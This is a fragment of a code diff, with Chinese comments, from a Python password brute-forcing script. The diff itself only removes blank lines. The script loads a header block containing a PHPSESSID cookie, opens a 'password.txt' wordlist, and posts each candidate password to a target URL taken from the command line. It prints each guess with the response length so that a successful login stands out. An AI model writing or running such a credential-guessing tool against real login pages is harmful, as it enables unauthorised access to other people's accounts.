@@ -17,7 +17,6 @@ Cookie: PHPSESSID=1g0kj04uc3ahskoaubeqpgud56
 Upgrade-Insecure-Requests: 1
 """
 
-
 def get_headers(url, test):
     headers = dict(line.split(": ", 1) for line in header.split("\n") if line != '')  # 通过原生请求头获取请求头字典
     f = open("password.txt", "r")  # 打开字典
@@ -33,6 +32,5 @@ def get_headers(url, test):
         }
         req = requests.post(url=url, headers=headers, data=values)  # 发送post请求
         print(pwd[0:-1]+'-->', len(req.text))  # 返回结果
-
 
 get_headers(sys.argv[1], sys.argv[2])
